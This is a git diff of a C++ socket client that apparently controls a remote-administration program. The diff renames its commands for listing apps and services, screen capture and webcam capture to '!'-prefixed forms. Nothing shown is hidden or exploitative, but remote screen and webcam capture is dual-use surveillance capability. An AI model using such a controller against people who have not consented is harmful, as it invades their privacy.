@@ -86,17 +86,11 @@ int main() {
 
     std::cout << "Connected to server at " << serverIP << ":" << serverPort << std::endl;
 
+    std::cout << "!help for list of commands" << std::endl;
+
     while (true) {
         char sendBuffer[1024] = {};
-        std::cout << "Enter command:\n"
-                  << "1. list app - List applications\n"
-                  << "2. list service - List services\n"
-                  << "3. screen capture - Capture screen\n"
-                  << "4. start webcam - Start webcam\n"
-                  << "5. get webcam frame - Get current webcam frame\n"
-                  << "6. stop webcam - Stop webcam\n"
-                  << "7. exit - Quit\n"
-                  << "Command: ";
+        std::cout << "Enter your message: ";
         std::cin.getline(sendBuffer, sizeof(sendBuffer));
 
         // List RadminVPN devices
@@ -109,7 +103,7 @@ int main() {
 
         send(clientSocket, sendBuffer, strlen(sendBuffer), 0);
 
-        if (strcmp(sendBuffer, "exit") == 0) {
+        if (strcmp(sendBuffer, "!exit") == 0) {
             break;
         }
 
@@ -146,7 +140,7 @@ int main() {
         }
 
         // Handle image data for both screen capture and webcam
-        if (strcmp(sendBuffer, "screen capture") == 0 || strcmp(sendBuffer, "get webcam frame") == 0) {
+        if (strcmp(sendBuffer, "!screenshot") == 0 || strcmp(sendBuffer, "!capture") == 0) {
             std::vector<char> imageData = receiveImageData(clientSocket);
             if (!imageData.empty()) {
                 std::string filename;
